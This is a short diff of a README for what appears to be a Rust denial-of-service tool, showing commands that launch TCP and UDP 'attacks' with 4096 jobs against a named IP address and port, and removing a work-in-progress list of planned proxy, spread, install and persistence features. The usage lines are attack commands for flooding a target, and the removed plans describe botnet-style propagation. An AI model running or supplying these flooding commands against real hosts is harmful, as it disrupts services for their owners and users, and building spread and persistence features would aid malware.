@@ -38,9 +38,3 @@ OR
 * start tcp attack with 4096 jobs: ```cargo run -- --tcp-addr 93.184.216.34:24535 --jobs 4096```
 
 * start udp attack with 4096 jobs: ```cargo run -- --udp-addr 93.184.216.34:24535 --jobs 4096```
-
-## 🏗️ WIP
-
-* proxy list
-
-* `spread`, `install` and `persistence` methods
